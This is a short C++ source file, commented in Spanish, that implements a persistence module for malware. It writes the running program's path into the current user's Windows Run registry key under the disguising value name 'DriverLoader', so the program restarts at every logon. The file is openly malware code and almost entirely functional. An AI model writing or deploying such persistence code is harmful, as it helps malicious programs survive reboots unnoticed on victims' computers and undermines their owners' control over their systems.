#include "Windows.h"
#include "Persistence.h"

/*
* Clase con tecnicas de persistencia usando llaves de registros
* 
* Obtienes la ruta de ejecución del malware, para alojarlo como un valor REG_SZ en la llave 
* "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run".
*/
Persistence::Persistence() {
	exec = Executable();
}

void Persistence::registryKeyCreation() {
	HKEY	hKey;
	LPCWSTR keyPath		= L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	LPCWSTR valueName	= L"DriverLoader";
	LPCWSTR currentPath = this->exec.getCurrentPath();
	LONG	result		= RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, &hKey);

	if (result == ERROR_SUCCESS) {
		result = RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)currentPath, static_cast<DWORD>((wcslen(currentPath) + 1) * sizeof(WCHAR)));
	}
	 
	RegCloseKey(hKey);
}